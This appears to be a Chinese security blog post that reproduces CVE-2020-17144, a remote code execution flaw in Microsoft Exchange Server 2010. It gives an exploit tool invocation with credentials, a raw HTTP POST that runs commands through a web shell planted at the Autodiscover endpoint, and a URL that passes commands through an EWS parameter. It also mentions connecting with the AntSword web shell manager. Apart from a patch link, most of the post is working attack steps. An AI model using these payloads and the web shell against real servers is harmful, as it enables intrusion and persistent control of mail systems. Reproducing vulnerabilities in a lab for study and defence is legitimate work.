**目录**

[漏洞背景](#t0 "漏洞背景")

[漏洞影响版本](#t1 "漏洞影响版本")

[漏洞复现](#t2 "漏洞复现")

[exp1](#t3 "exp1")

[exp2](#t4 "exp2")

[漏洞修复](#t5 "漏洞修复")

* * *

漏洞背景
----

在微软最新发布的12月安全更新中公布了一个存在于 Microsoft Exchange Server 2010中的远程代码执行漏洞（CVE-2020-17144），官方定级 Important。该漏洞是由程序未正确校验cmdlet参数引起，经过身份验证的攻击者利用该漏洞可实现远程代码执行。该漏洞和 CVE-2020-0688 类似，也需要登录后才能利用，不过在利用时无需明文密码，只要具备 NTHash 即可。除了常规邮件服务与 OWA外，EWS接口也提供了利用所需的方法，漏洞的功能点本身还具备持久化功能。

漏洞影响版本
------

*   Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 31

漏洞复现
----

### exp1

```
CVE-2020-17144.exe 10.211.55.7 test P@ss1234
```


![](https://img-blog.csdnimg.cn/img_convert/157b54151e606bb7bc005e18796b9e69.png)

![](https://img-blog.csdnimg.cn/img_convert/2bf6b91da5337a12b141d155a5e3ecf5.png)

![](https://img-blog.csdnimg.cn/img_convert/3e903b7cc71439a9f4e95052eb601fb3.png)

```
POST /autodiscover/Services.aspx HTTP/1.1
Host: 10.211.55.7
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11\_2\_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

Ladon=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());
```


![](https://img-blog.csdnimg.cn/img_convert/43a916262dd9c7999e3f4fd3f3afde1a.png)

![](https://img-blog.csdnimg.cn/img_convert/acf04851a0ca005bbb835da8055e6427.png)

也可以用蚁剑直接连接

![](https://img-blog.csdnimg.cn/img_convert/4de968faf9e9298d4c53423ad1fcf0a3.png)

这里注意其他设置需要忽略https证书

![](https://img-blog.csdnimg.cn/img_convert/8a86b32887205704ba035d5a46e915d1.png)

![](https://img-blog.csdnimg.cn/img_convert/18276c6d66e4b716b487dd39bfa3f048.png)

### exp2

![](https://img-blog.csdnimg.cn/img_convert/5fc3a4a04189adc1ed7b916e7ab634bf.png)

```
http://10.211.55.7/ews/soap/?pass=whoami
```


![](https://img-blog.csdnimg.cn/img_convert/28cd8e1586e721435b6a983930979fc7.png)

漏洞修复
----

下载补丁更新：[Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17144 "Security Update Guide - Microsoft Security Response Center")

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[从 CVE-2020-17144 看实战环境的漏洞武器化](https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&mid=2247483712&idx=1&sn=0b2cc3c9692f5c58a4eeb246d4b392fc&chksm=eaa5bb60ddd23276baf4cfd3fc59ca847c28f350c65ef98a17d49bc9944d653fad95dec4fd14&mpshare=1&scene=1&srcid=1209jtbQLVJIgr3VT0Ut1TM9&sharer_sharetime=1607483575995&sharer_shareid=dc9cecc79ba34e4bbb700a43a16153fd#rd "从 CVE-2020-17144 看实战环境的漏洞武器化")